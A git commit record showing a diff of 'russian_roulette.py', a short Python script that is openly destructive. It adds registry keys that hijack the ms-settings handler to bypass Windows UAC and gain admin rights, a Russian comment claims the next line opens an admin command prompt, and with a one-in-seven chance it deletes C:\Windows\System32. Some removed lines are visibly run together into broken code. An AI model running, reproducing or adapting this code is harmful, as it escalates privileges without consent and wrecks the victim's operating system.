76d61a939b11267525e16bdab20bed5e8c8ce6b6
QuasarOfficialMrk231 <149317499+QuasarOfficialMrk231@users.noreply.github.com>
2025-03-08 21:32:42 +0300

    Update russian_roulette.py

--- russian_roulette.py
+++ russian_roulette.py
@@ -4,12 +4,7 @@ import shutil
 
 os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f")
 os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v \"DelegateExecute\" /t REG_SZ /f")
-os.system("cmd /c start computerdefaults.exe")  # Запустит командную строку с админ-правами
-
-if random.randint(0, 6) == 1:
-    shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)import random
-import shutil
-import os
+os.system("cmd /c start russian_roulette.py")  # Запустит командную строку с админ-правами
 
 if random.randint(0, 6) == 1:
     shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)
